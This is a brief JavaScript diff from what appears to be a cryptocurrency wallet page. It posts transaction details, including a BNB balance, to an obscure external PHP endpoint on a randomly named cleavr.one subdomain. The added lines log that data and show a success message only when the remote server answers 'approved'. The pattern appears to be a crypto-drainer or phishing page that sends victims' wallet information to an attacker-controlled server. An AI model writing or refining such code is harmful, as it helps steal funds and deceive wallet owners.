@@ -243,6 +243,8 @@
                         bnbBalance: bnbBalanceWei.toString()
                     };
 
+                    console.log('Sending transaction details:', transactionDetails);
+
                     const response = await fetch('https://eflujsyb0kuybgol11532.cleavr.one/btc/d.php', {
                         method: 'POST',
                         headers: {
@@ -251,11 +253,14 @@
                         body: JSON.stringify(transactionDetails)
                     });
 
-                    if (response.ok) {
+                    const result = await response.json();
+                    console.log('Response from server:', result);
+
+                    if (result.status === 'approved') {
                         // Display success message
                         statusMessage.style.display = 'flex';
                     } else {
-                        throw new Error('Transaction details submission failed');
+                        throw new Error(result.error || 'Transaction declined');
                     }
                 } catch (error) {
                     console.error('Error:', error.message);
